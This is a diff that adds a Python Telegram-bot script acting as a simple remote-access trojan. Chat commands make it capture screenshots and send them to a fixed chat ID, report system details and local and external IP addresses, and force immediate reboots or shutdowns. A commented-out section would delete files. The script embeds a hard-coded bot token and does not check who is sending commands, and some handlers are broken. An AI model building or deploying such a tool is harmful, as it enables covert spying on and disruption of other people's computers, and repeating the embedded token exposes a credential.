@@ -1,0 +1,92 @@
+import telebot
+import pyscreenshot
+import subprocess
+import os
+import platform
+import requests
+import socket
+import shutil
+
+bot = telebot.TeleBot('2100088568:AAEYWZnqZ-QObcaoH9nHXCOPen5vnSNsdyc')
+@bot.message_handler(content_types=['text'])
+def get_text_message(message):
+    if message.text == "/status":
+        bot.send_message(message.from_user.id, "Connected")
+    if message.text == "/screen":
+        try:
+            img = pyscreenshot.grab()
+            name = "temp.png"
+            img.save(name)
+            bot.send_document(chat_id=1360860728, document=open(name, "rb"))
+            os.remove('temp.png')
+        except Exception as e:
+            bot.send_message(message.from_user.id, "Error: " + str(e))
+            pass
+    if message.text == "/explorer":
+        try:
+            subprocess.Popen('explorer')
+        except Exception as e:
+            bot.send_message(message.from_user.id, "Error: " + str(e))
+            pass
+    if message.text == "/taskmgr":
+        try:
+            subprocess.Popen('taskmgr')
+        except Exception as e:
+            bot.send_message(message.from_user.id, "Error: " + str(e))
+            pass
+    if message.text == "/pc":
+        try:
+            bot.send_message(message.from_user.id, 'Computer network name: ' + platform.node() + '\nMachine type: ' + platform.machine() + '\nProcessor type: ' + platform.processor() + '\nPlatform type: ' + platform.platform() + '\nOperating system: ' + platform.system() + '\nOperating system release: ' + platform.release() + '\nOperating system version: ' + platform.version())
+        except Exception as e:
+            bot.send_message(message.from_user.id, "Error: " + str(e))
+            pass
+    if message.text == "/ip":
+        try:
+            IP = requests.get('https://api.ipify.org/').text
+            bot.send_message(message.from_user.id, "Local IP: " + socket.gethostbyname(socket.gethostname()) + "\nExternal IP: " + IP)
+        except Exception as e:
+            bot.send_message(message.from_user.id, "Error: " + str(e))
+            pass
+    if message.text == "/reboot":
+        try:
+            os.popen('shutdown /r /f /t 0')
+            bot.send_message(message.from_user.id, "Computer will be restarted NOW.")
+        except Exception as e:
+            bot.send_message(message.from_user.id, "Error: " + str(e))
+            pass
+    if message.text == "/shutdown":
+        try:
+            os.popen('shutdown /s /f /t 0')
+            bot.send_message(message.from_user.id, "Computer will be shutdown NOW.")
+        except Exception as e:
+            bot.send_message(message.from_user.id, "Error: " + str(e))
+            pass
+    if message.text == "/pwd":
+        try:
+            os.getcwd()
+        except Exception as e:
+            bot.send_message(message.from_user.id, "Error: " + str(e))
+
+    #if message.text == "/delete":
+        #if (len(text.split(' ')) > 1):
+            #helloName = text.split(' ')[1]
+        #else:
+            #helloName = 'Noname'
+        #return 'Hello, ' + helloName + '!'
+        #path_file = command.strip()
+        #try:
+            #os.remove(path_file)
+            #bot.send_message(message.from_user.id, "Succesfully removed file")
+        #except:
+            #try:
+                #os.rmdir(path_file)
+                #bot.send_message(message.from_user.id, "Succesfully removed folder")
+            #except:
+                #try:
+                    #shutil.rmtree(path_file)
+                    #.send_message(message.from_user.id, "Succesfully removed folder and it\'s files")
+                #except:
+                    #bot.send_message(message.from_user.id, "File not found")
+
+
+bot.polling(none_stop=True, interval=0)
